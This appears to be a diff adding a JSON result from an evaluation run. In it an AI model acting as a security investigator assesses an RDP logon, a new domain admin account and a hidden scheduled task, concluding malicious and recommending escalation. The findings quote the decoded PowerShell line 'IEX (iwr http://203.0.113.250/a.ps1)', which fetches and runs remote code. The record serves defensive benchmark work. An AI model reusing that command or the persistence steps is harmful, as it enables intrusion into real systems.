@@ -1,0 +1,97 @@
+{
+ "run_id": "A__T047__C1__20261115T045937Z",
+ "config": "A",
+ "scenario_id": "T047",
+ "condition": "C1",
+ "model": "gpt-6-luna",
+ "n_records_in_view": 179,
+ "system": "You are a security investigator reviewing an alert. Base every claim only on the evidence available to you. Cite the record IDs that support each observation.",
+ "task_chars": 74367,
+ "attempts": [
+  {
+   "answer": "{\n  \"assessment\": \"malicious\",\n  \"confidence\": 0.99,\n  \"supporting_observations\": [\n    {\n      \"claim\": \"At 13:39:54 UTC, sam.okafor logged on to WS-LMARTINS-01 with LogonType 10 from 203.0.113.250; the same address appears in the inbound connection to port 3389. This conflicts with the supplied inventory stating remote administration is only from WS-SOKAFOR-01 and there is no VPN.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T047-00063\", \"T047-00064\", \"T047-00065\"]\n    },\n    {\n      \"claim\": \"The logon received special privileges, including SeDebugPrivilege.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T047-00066\"]\n    },\n    {\n      \"claim\": \"At 13:43:55 UTC, sam.okafor created the sysmaint account; one second later, sysmaint was added to the domain Administrators group.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T047-00081\", \"T047-00082\"]\n    },\n    {\n      \"claim\": \"At 13:43:57 UTC, a scheduled task named Microsoft\\\\Windows\\\\HealthCheck was created on WS-LMARTINS-01 under sam.okafor. It runs hidden PowerShell with an encoded command that decodes to `IEX (iwr http://203.0.113.250/a.ps1)`.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T047-00083\"]\n    },\n    {\n      \"claim\": \"The unusual remote logon, creation of an administrator account, and task configured to retrieve and execute a script from the same IP form a strongly suspicious sequence. The evidence supports treating this as malicious activity, though it does not establish who controlled the remote address.\",\n      \"claim_type\": \"inferred_claim\",\n      \"record_ids\": [\"T047-00063\", \"T047-00065\", \"T047-00081\", \"T047-00082\", \"T047-00083\"]\n    }\n  ],\n  \"known_telemetry_limitations\": [\n    \"The supplied records show task creation and its configured action, but do not show whether the task ran or what the downloaded script contained.\",\n    \"The records do not attribute 203.0.113.250 to a person or establish how the connection was made.\",\n    \"The supplied evidence does not show subsequent use of sysmaint or the full account and group-change history.\"\n  ],\n  \"claims_not_established\": [\n    \"Whether sam.okafor personally initiated the remote logon and account changes, or whether the account or session was compromised.\",\n    \"Whether the scheduled task executed successfully and what its retrieved script did.\",\n    \"Whether sysmaint was used after creation, or whether additional persistence or data access occurred.\"\n  ],\n  \"recommended_action\": \"escalate\",\n  \"additional_evidence_needed\": [\n    \"Preserve and investigate WS-LMARTINS-01, including the scheduled task's execution history, PowerShell logs, and any downloaded script or related files.\",\n    \"Review DC-NWD-01 account and group audit events and authentication records for sysmaint and sam.okafor beyond the supplied records.\",\n    \"Correlate the source address and RDP session with network, firewall, and endpoint telemetry, and confirm with sam.okafor whether the activity was authorized.\",\n    \"Check for follow-on access, persistence, and data transfer from WS-LMARTINS-01 and any systems reached using sysmaint.\"\n  ]\n}",
+   "valid": true,
+   "validation_errors": [],
+   "model_returned": "gpt-6-luna",
+   "finish_reason": "stop",
+   "usage": {
+    "input": 27873,
+    "output": 1820,
+    "reasoning": 1024
+   }
+  }
+ ],
+ "error": null,
+ "parsed": {
+  "assessment": "malicious",
+  "confidence": 0.99,
+  "supporting_observations": [
+   {
+    "claim": "At 13:39:54 UTC, sam.okafor logged on to WS-LMARTINS-01 with LogonType 10 from 203.0.113.250; the same address appears in the inbound connection to port 3389. This conflicts with the supplied inventory stating remote administration is only from WS-SOKAFOR-01 and there is no VPN.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T047-00063",
+     "T047-00064",
+     "T047-00065"
+    ]
+   },
+   {
+    "claim": "The logon received special privileges, including SeDebugPrivilege.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T047-00066"
+    ]
+   },
+   {
+    "claim": "At 13:43:55 UTC, sam.okafor created the sysmaint account; one second later, sysmaint was added to the domain Administrators group.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T047-00081",
+     "T047-00082"
+    ]
+   },
+   {
+    "claim": "At 13:43:57 UTC, a scheduled task named Microsoft\\Windows\\HealthCheck was created on WS-LMARTINS-01 under sam.okafor. It runs hidden PowerShell with an encoded command that decodes to `IEX (iwr http://203.0.113.250/a.ps1)`.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T047-00083"
+    ]
+   },
+   {
+    "claim": "The unusual remote logon, creation of an administrator account, and task configured to retrieve and execute a script from the same IP form a strongly suspicious sequence. The evidence supports treating this as malicious activity, though it does not establish who controlled the remote address.",
+    "claim_type": "inferred_claim",
+    "record_ids": [
+     "T047-00063",
+     "T047-00065",
+     "T047-00081",
+     "T047-00082",
+     "T047-00083"
+    ]
+   }
+  ],
+  "known_telemetry_limitations": [
+   "The supplied records show task creation and its configured action, but do not show whether the task ran or what the downloaded script contained.",
+   "The records do not attribute 203.0.113.250 to a person or establish how the connection was made.",
+   "The supplied evidence does not show subsequent use of sysmaint or the full account and group-change history."
+  ],
+  "claims_not_established": [
+   "Whether sam.okafor personally initiated the remote logon and account changes, or whether the account or session was compromised.",
+   "Whether the scheduled task executed successfully and what its retrieved script did.",
+   "Whether sysmaint was used after creation, or whether additional persistence or data access occurred."
+  ],
+  "recommended_action": "escalate",
+  "additional_evidence_needed": [
+   "Preserve and investigate WS-LMARTINS-01, including the scheduled task's execution history, PowerShell logs, and any downloaded script or related files.",
+   "Review DC-NWD-01 account and group audit events and authentication records for sysmaint and sam.okafor beyond the supplied records.",
+   "Correlate the source address and RDP session with network, firewall, and endpoint telemetry, and confirm with sam.okafor whether the activity was authorized.",
+   "Check for follow-on access, persistence, and data transfer from WS-LMARTINS-01 and any systems reached using sysmaint."
+  ]
+ },
+ "status": "VALID",
+ "faithfulness_precheck": {
+  "n_cited": 12,
+  "n_missing": 0,
+  "missing": []
+ },
+ "duration_s": 17.8
+}
